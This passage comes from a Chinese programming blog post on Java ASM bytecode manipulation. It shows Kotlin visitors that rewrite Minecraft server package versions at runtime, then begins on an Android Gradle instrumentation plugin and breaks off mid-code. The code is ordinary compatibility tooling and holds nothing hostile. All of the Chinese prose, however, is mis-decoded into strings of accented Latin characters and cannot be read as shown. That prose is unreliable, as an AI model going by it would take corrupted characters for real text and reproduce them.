åå¯¹å…¶è¿›è¡Œå°è£…è€Œæ¥çš„ï¼Œè€Œä½œä¸ºæœåŠ¡ç«¯æ’ä»¶å¼€å‘è€…ï¼Œæˆ‘ä»¬å¤§éƒ¨åˆ†æ—¶å€™åªéœ€è¦ç”¨åˆ°ç¬¬ä¸‰æ–¹å°è£…çš„APIï¼Œä½†ä¹Ÿæœ‰ä¾‹å¤–ã€‚</p><p>å½“æˆ‘ä»¬éœ€è¦è°ƒç”¨å®˜æ–¹æœåŠ¡ç«¯çš„ä»£ç ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ï¼šä¸åŒç‰ˆæœ¬çš„æœåŠ¡ç«¯çš„å®˜æ–¹æœåŠ¡ç«¯ä»£ç çš„åŒ…åä¸ä¸€æ ·ï¼Œå®ƒä»¬è¢«ç‰ˆæœ¬å·åˆ†éš”å¼€æ¥ã€‚</p><p>æ¯”å¦‚ï¼Œåœ¨Minecraft 1.16.5ç‰ˆæœ¬çš„å®˜æ–¹ä»£ç ä¸­ï¼Œæ‰€æœ‰ç±»éƒ½åœ¨<code>net.minecraft.server.v1_16_R3</code>åŒ…ä¸‹</p><p>ä½†åœ¨Minecraft 1.12.2ç‰ˆæœ¬çš„ä»£ç ä¸­ï¼Œæ‰€æœ‰ç±»éƒ½åœ¨<code>net.minecraft.server.v1_12_R1</code>åŒ…ä¸‹</p><p>å…³é”®æ˜¯å®ƒä»¬ä¹‹é—´çš„ä»£ç å…¶å®æ²¡æœ‰å¾ˆå¤§çš„æ”¹åŠ¨ï¼Œå°±æ˜¯åŒ…åä¸ä¸€æ ·äº†</p><p>è€ƒè™‘åˆ°ç‰ˆæœ¬å…¼å®¹é—®é¢˜ï¼Œå¼€å‘è€…ä¸€èˆ¬ä¸ä¼šç›´æ¥è°ƒç”¨<code>n.m.s</code>åŒ…ä¸‹çš„ä»£ç ï¼Œåœ¨ASMVersionControlè¿™ä¸ªè§£å†³æ–¹æ¡ˆè¯ç”Ÿä¹‹å‰ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆ</p><ul><li>è¿è¡Œæ—¶è·å–ç‰ˆæœ¬å·ï¼Œç„¶åæ‹¼æ¥å­—ç¬¦ä¸²é€šè¿‡åå°„è°ƒç”¨</li><li>ä¸ºä¸åŒç‰ˆæœ¬å†™å¤šä»½ä»£ç ï¼Œå†åœ¨è¿è¡Œæ—¶åˆ¤æ–­å½“å‰è¿è¡Œç‰ˆæœ¬æ¥å†³å®šè°ƒç”¨å“ªä¸€ä»½</li></ul><p>è¿™ä¸¤ç§è§£å†³æ–¹æ¡ˆéƒ½ä¸å¤ªå°½äººæ„ã€‚åå°„è°ƒç”¨ä¸ä»…éº»çƒ¦ï¼Œè¿˜ä¼šå¯¼è‡´é¢å¤–çš„æ€§èƒ½å¼€é”€ã€‚è€Œç¼–å†™å¤šä»½ä»£ç æ›´æ˜¯ç™½ç™½å¢åŠ äº†å¼€å‘è€…çš„å·¥ä½œé‡ï¼Œè€Œä¸”éœ€è¦å¯¼å…¥å¤šä¸ªç‰ˆæœ¬çš„æœåŠ¡ç«¯æ ¸å¿ƒä¾èµ–ï¼Œå¯¼åŒ…çš„æ—¶å€™åŠå…¶å®¹æ˜“å¯¼é”™ã€‚</p><p>è¿™æ—¶å€™<code>ASMVersionControl</code>åº”è¿è€Œç”Ÿï¼Œå¼€å‘è€…åªéœ€è¦åœ¨ä¸€ä¸ªå®ç°ç±»ä¸­å†™ä¸€ä»½ä»£ç ï¼Œä¾¿å¯ä»¥é€šè¿‡ASMåŠ¨æ€ä»£ç†å¾—åˆ°ä¸€ä¸ªå®ä¾‹ã€‚å¼€å‘è€…å¯ä»¥æ”¾å¿ƒè°ƒç”¨å®ä¾‹ä¸­çš„æ–¹æ³•ï¼Œå› ä¸ºè¿™ä¸ªå®ä¾‹å·²ç»è¢«asmä¿®æ”¹è¿‡äº†ï¼Œæ‰€æœ‰<code>n.m.s</code>è°ƒç”¨çš„åŒ…åçš„ç‰ˆæœ¬å·éƒ¨åˆ†å…¨éƒ¨è¢«ä¿®æ”¹ä¸ºäº†è¿è¡Œç¯å¢ƒçš„ç‰ˆæœ¬å·ã€‚</p></blockquote><p>è¿™éƒ¨åˆ†é€»è¾‘å…¶å®ASMå·²ç»æä¾›äº†ä¸€ä¸ªç°æˆçš„å·¥å…·<code>ClassRemapper</code>æ¥å®ç°ï¼Œä½†å®ƒæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªè¢«å°è£…è¿‡çš„<code>ClassVisitor</code>ï¼Œä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘ä»¬ä½¿ç”¨ClassVisitorå®ç°ã€‚</p><p>å¦‚æœä½ æƒ³çŸ¥é“ä½¿ç”¨ClassRemapperå¦‚ä½•å®ç°ï¼Œçœ‹è¿™é‡Œ<a href="https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt">taboolib/MinecraftRemapper.kt at master Â· TabooLib/taboolib (github.com)</a></p><p>æˆ–è€…ä½ ä¹Ÿå¯ä»¥è¯•ç€è‡ªå·±å®ç°ä¸€ä¸‹ClassRemapperçš„å°è£…ï¼Œæ¯”è¾ƒç®€å•ã€‚</p><p>æˆ‘ä»¬å…ˆæ¨¡æ‹Ÿä¸¤ä¸ªâ€œä¸åŒç‰ˆæœ¬â€ä¸‹çš„ç±»ï¼Œä¹Ÿå°±æ˜¯åŒ…åä¸åŒï¼Œä½†æ–¹æ³•å£°æ˜ç›¸åŒï¼Œå®ç°ç•¥æœ‰ä¸åŒçš„ä¸¤ä¸ªç±»ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// net.minecraft.server.v1_12_R1</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"execute successfully v1.12"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// net.minecraft.server.v1_16_R3</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"execute successfully v1.16"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç†æƒ³çš„çŠ¶æ€æ˜¯ï¼Œæˆ‘è¦è®©æˆ‘è°ƒç”¨<code>net.minecraft.server.v1_12_R1</code>çš„æ‰€æœ‰æ–¹æ³•å…¨éƒ¨å˜æˆ<code>net.minecraft.server.v1_16_R3</code>ã€‚</p><p>æˆ‘ä»¬å…ˆå†™ä¸€æ®µä¼ªä»£ç </p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">import</span> net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>server<span class="token punctuation">.</span>v1_12_R1<span class="token punctuation">.</span>Test<span class="token keyword">interface</span> NMSHandler <span class="token punctuation">{</span>    <span class="token keyword">fun</span> <span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">class</span> NMSHandlerImpl <span class="token operator">:</span> NMSHandler <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// è·å¾—asmä¿®æ”¹è¿‡çš„ä»£ç†å¯¹è±¡</span>    <span class="token keyword">val</span> nmsProxy<span class="token operator">:</span> NMSHandler <span class="token operator">=</span> createProxyInstance<span class="token operator">&lt;</span>NMSHandler<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    nmsProxy<span class="token punctuation">.</span><span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// è¿™é‡Œè¾“å‡º execute successfully v1.16, è¯´æ˜æˆ‘ä»¬ä¿®æ”¹æˆåŠŸäº†</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>NMSHandlerImpl#callTest</code>çš„å­—èŠ‚ç æŒ‡ä»¤</p><blockquote><p>   L0<br>    LINENUMBER 85 L0<br>    NEW net/minecraft/server/v1_12_R1/Test<br>    DUP<br>    INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V<br>    INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V<br>   L1<br>    LINENUMBER 86 L1<br>    RETURN<br>   L2<br>    LOCALVARIABLE this Lorg/example/asmlearn/NMSHandlerImpl; L0 L2 0<br>    MAXSTACK = 2<br>    MAXLOCALS = 1</init></p></blockquote><p>æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹å…¶ä¸­æ‰€æœ‰çš„ <code>net/minecraft/server/v1_12_R1/Test</code>ä¸º<code>net/minecraft/server/v1_16_R3/Test</code>å³å¯ï¼Œç›®å‰ä¸ºæ­¢æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬è‚¯å®šé¦–å…ˆè¦å…ˆvisitMethodï¼Œç„¶ååœ¨å…·ä½“çš„æ“ä½œæ–¹æ³•ã€‚</p><blockquote><p>éœ€è¦ä¿®æ”¹çš„æŒ‡ä»¤ï¼š</p><ul><li><p>NEW net/minecraft/server/v1_12_R1/Test</p></li><li><p>INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V</init></p></li><li><p>INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V</p></li></ul></blockquote><p>åœ¨<a href="https://www.bilibili.com/read/cv13433468">Java ASMè¯¦è§£ï¼šMethodVisitorå’ŒOpcodeï¼ˆäºŒï¼‰ç±»å‹ã€æ•°ç»„ã€å­—æ®µã€æ–¹æ³•ã€å¼‚å¸¸ä¸åŒæ­¥ - å“”å“©å“”å“© (bilibili.com)</a>å¯¹ç…§</p><p>å‘ç°æˆ‘ä»¬åªéœ€è¦é‡å†™<code>visitTypeInsn</code>, <code>visitMethodInsn</code>ï¼Œå¹¶åœ¨é‡Œé¢æ›¿æ¢å¯¹åº”çš„å‚æ•°å³å¯ã€‚</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> <span class="token function">VersionControlMethodVisitor</span><span class="token punctuation">(</span>methodVisitor<span class="token operator">:</span> MethodVisitor<span class="token punctuation">,</span> <span class="token keyword">private</span> <span class="token keyword">val</span> currentVersion<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">MethodVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> methodVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> type<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span> type<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>currentVersion<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>        opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span>        owner<span class="token operator">:</span> String<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token punctuation">,</span>        isInterface<span class="token operator">:</span> Boolean    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span> owner<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>currentVersion<span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> isInterface<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®Œæ•´ä»£ç å¦‚ä¸‹:</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">import</span> net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>server<span class="token punctuation">.</span>v1_12_R1<span class="token punctuation">.</span>Test<span class="token keyword">class</span> <span class="token function">VersionControlClassVisitor</span><span class="token punctuation">(</span>classVisitor<span class="token operator">:</span> ClassVisitor<span class="token punctuation">,</span> <span class="token keyword">val</span> currentVersion<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">ClassVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> classVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitField</span><span class="token punctuation">(</span>        access<span class="token operator">:</span> Int<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        signature<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        value<span class="token operator">:</span> Any<span class="token operator">?</span>    <span class="token punctuation">)</span><span class="token operator">:</span> FieldVisitor <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">VersionControlFieldVisitor</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitField</span><span class="token punctuation">(</span>access<span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">,</span> currentVersion<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethod</span><span class="token punctuation">(</span>        access<span class="token operator">:</span> Int<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        signature<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        exceptions<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> String<span class="token operator">&gt;</span><span class="token operator">?</span>    <span class="token punctuation">)</span><span class="token operator">:</span> MethodVisitor <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">VersionControlMethodVisitor</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitMethod</span><span class="token punctuation">(</span>access<span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> exceptions<span class="token punctuation">)</span><span class="token punctuation">,</span> currentVersion<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token function">VersionControlMethodVisitor</span><span class="token punctuation">(</span>methodVisitor<span class="token operator">:</span> MethodVisitor<span class="token punctuation">,</span> <span class="token keyword">private</span> <span class="token keyword">val</span> currentVersion<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">MethodVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> methodVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> type<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span> type<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>currentVersion<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>        opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span>        owner<span class="token operator">:</span> String<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token punctuation">,</span>        isInterface<span class="token operator">:</span> Boolean    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span> owner<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>currentVersion<span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> isInterface<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token function">VersionControlFieldVisitor</span><span class="token punctuation">(</span>fieldVisitor<span class="token operator">:</span> FieldVisitor<span class="token punctuation">,</span> <span class="token keyword">val</span> currentVersion<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">FieldVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> fieldVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">val</span> nms <span class="token operator">=</span> <span class="token string">"net/minecraft/server/v1_.*?/"</span><span class="token punctuation">.</span><span class="token function">toRegex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">val</span> obc <span class="token operator">=</span> <span class="token string">"org/bukkit/craftbukkit/v1_.*?/"</span><span class="token punctuation">.</span><span class="token function">toRegex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">fun</span> String<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>version<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token operator">:</span> String <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>nms<span class="token punctuation">,</span> <span class="token string">"net/minecraft/server/<span class="token interpolation variable">$version</span>/"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>obc<span class="token punctuation">,</span> <span class="token string">"org/bukkit/craftbukkit/<span class="token interpolation variable">$version</span>/"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token annotation builtin">@Suppress</span><span class="token punctuation">(</span><span class="token string">"UNCHECKED_CAST"</span><span class="token punctuation">)</span><span class="token keyword">inline</span> <span class="token keyword">fun</span> <span class="token operator">&lt;</span><span class="token keyword">reified</span> T<span class="token operator">&gt;</span> <span class="token function">createProxyClass</span><span class="token punctuation">(</span>impl<span class="token operator">:</span> String <span class="token operator">=</span> T<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"Impl"</span><span class="token punctuation">)</span><span class="token operator">:</span> Class<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> input <span class="token operator">=</span> VersionControlClassVisitor<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>impl<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".class"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> classReader <span class="token operator">=</span> <span class="token function">ClassReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span>    <span class="token keyword">val</span> classWriter <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span>ClassWriter<span class="token punctuation">.</span>COMPUTE_MAXS<span class="token punctuation">)</span>    classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token function">VersionControlClassVisitor</span><span class="token punctuation">(</span>classWriter<span class="token punctuation">,</span> <span class="token string">"v1_16_R3"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> MyClassLoader<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>impl<span class="token punctuation">,</span> classWriter<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> Class<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span><span class="token punctuation">}</span><span class="token keyword">inline</span> <span class="token keyword">fun</span> <span class="token operator">&lt;</span><span class="token keyword">reified</span> T<span class="token operator">&gt;</span> <span class="token function">createProxyInstance</span><span class="token punctuation">(</span>impl<span class="token operator">:</span> String <span class="token operator">=</span> T<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"Impl"</span><span class="token punctuation">)</span><span class="token operator">:</span> T <span class="token punctuation">{</span>    <span class="token keyword">return</span> createProxyClass<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span><span class="token punctuation">(</span>impl<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">interface</span> NMSHandler <span class="token punctuation">{</span>    <span class="token keyword">fun</span> <span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">class</span> NMSHandlerImpl <span class="token operator">:</span> NMSHandler <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> proxy <span class="token operator">=</span> createProxyInstance<span class="token operator">&lt;</span>NMSHandler<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    proxy<span class="token punctuation">.</span><span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢è¿™æ®µä»£ç çš„è¿è¡Œç»“æœæ˜¯<code>execute successfully v1.16</code>,è¯æ˜æˆ‘ä»¬æˆåŠŸæ›¿æ¢äº†ä»£ç†ç±»ä¸­çš„åŒ…åã€‚</p><p>å…¶å®gradleæ’ä»¶shadowJaré‡å®šå‘(relocate)åŒ…åçš„åŠŸèƒ½çš„å®ç°ä¹Ÿå¤§åŒå°å¼‚ï¼Œå¤§å®¶æœ‰å…´è¶£å¯ä»¥è¯¾ä¸‹è‡ªå·±å»å®ç°ä¸€ä¸‹ã€‚</p><h5 id="å­—èŠ‚ç æ’æ¡©"><a href="#å­—èŠ‚ç æ’æ¡©" class="headerlink" title="å­—èŠ‚ç æ’æ¡©"></a>å­—èŠ‚ç æ’æ¡©</h5><p>å‰é¢å‡ ä¸ªå…¶å®å¹¶ä¸æ˜¯æˆ‘ä»¬å®‰å“å¼€å‘ç»å¸¸é‡åˆ°çš„é—®é¢˜ï¼Œåªæ˜¯å®ƒä»¬è§£å†³èµ·æ¥ç›¸å¯¹ç®€å•ã€‚å®‰å“å¼€å‘ä¸­asmæ¡†æ¶ä¸»è¦æ˜¯ç”¨æ¥å­—èŠ‚ç æ’æ¡©çš„ã€‚</p><p>å­—èŠ‚ç æ’æ¡©å…¶å®æ˜¯hookçš„ä¸€ç§ã€‚</p><p>è¿™ä¸ªæˆ‘ä»¬å°±ä¸è‡ªå·±å†™äº†ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹å¤§ä½¬å†™çš„æ¡ˆä¾‹â€”â€”ç”¨å­—èŠ‚ç æ’æ¡©å®ç°åŒå‡»é˜²æŠ–ã€‚</p><p>å…ˆè´´ä¸‹æºç é“¾æ¥: <a href="https://github.com/leavesCZY/ASM_Transform">leavesCZY/ASM_Transform: ASM Transform å­—èŠ‚ç æ’æ¡©å®æˆ˜ (github.com)</a></p><p>è°·æ­Œä¸ºandroidé‡èº«å®šåˆ¶äº†å®‰å“å­—èŠ‚ç æ’æ¡©çš„è§£å†³æ–¹æ¡ˆ<code>transform api</code>æ¥é…åˆgradleä½¿ç”¨ï¼Œ<em><strong>ä¸è¿‡å®ƒç°åœ¨å·²ç»å³å°†åºŸå¼ƒäº†ï¼Œæœ€æ–°çš„è§£å†³æ–¹æ¡ˆæ˜¯Gradleæä¾›çš„TransformAction</strong></em>ï¼Œä¸è¿‡è¿™é‡Œæˆ‘ä»¬è¦çœ‹çš„æºç ä»ç„¶æ˜¯ä½¿ç”¨transform apiæ¥å®ç°å­—èŠ‚ç æ’æ¡©ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ã€‚</p><h6 id="gradleæ’ä»¶ç¼–å†™"><a href="#gradleæ’ä»¶ç¼–å†™" class="headerlink" title="gradleæ’ä»¶ç¼–å†™"></a>gradleæ’ä»¶ç¼–å†™</h6><blockquote><p>å­—èŠ‚ç æ’æ¡©ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡è‡ªå®šä¹‰gradleæ’ä»¶å¹²é¢„ç¼–è¯‘å®ç°çš„</p><p>å‡†ç¡®æ¥è¯´æ˜¯åœ¨ç¼–è¯‘åå†å¯¹ç¼–è¯‘äº§ç‰©å¤„ç†ä¸€é</p></blockquote><p>é¦–å…ˆæˆ‘ä»¬æ–°å»ºä¸€ä¸ª<code>buildSrc</code>æ¨¡å—ï¼Œ<code>buildSrc</code>æ¨¡å—ä¸­çš„ä»£ç å¯ä»¥åœ¨å…¶ä»–æ¨¡å—çš„build.gradleä¸­ç›´æ¥å¼•å…¥ä½¿ç”¨ã€‚</p><p>ç„¶ååˆ›å»ºä¸€ä¸ªæ’ä»¶ç±»</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">/** * @Author: leavesCZY * @Date: 2021/12/2 16:02 * @Desc: */</span><span class="token keyword">class</span> DoubleClickPlugin <span class="token operator">:</span> Plugin<span class="token operator">&lt;</span>Project<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">apply</span><span class="token punctuation">(</span>project<span class="token operator">:</span> Project<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> config <span class="token operator">=</span> <span class="token function">DoubleClickConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">val</span> appExtension<span class="token operator">:</span> AppExtension <span class="token operator">=</span> project<span class="token 